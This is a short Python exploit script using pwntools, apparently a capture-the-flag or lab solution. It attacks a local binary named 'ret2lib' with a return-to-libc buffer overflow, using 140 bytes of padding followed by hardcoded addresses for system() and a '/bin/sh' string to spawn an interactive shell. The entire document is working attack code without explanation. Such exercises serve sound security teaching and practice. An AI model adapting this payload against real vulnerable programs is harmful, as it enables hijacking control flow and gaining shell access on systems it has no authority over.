from pwn import *

#context.log_level = 'debug'

debug = 1

if debug:
	sh = process('./ret2lib')

system_addr = 0xf7e08870
binsh_addr  = 0xf7f47968
payload = 'a' * 140 + p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr)

def pwn(sh, payload):
	sh.sendline(payload)
	sh.interactive()

pwn(sh, payload)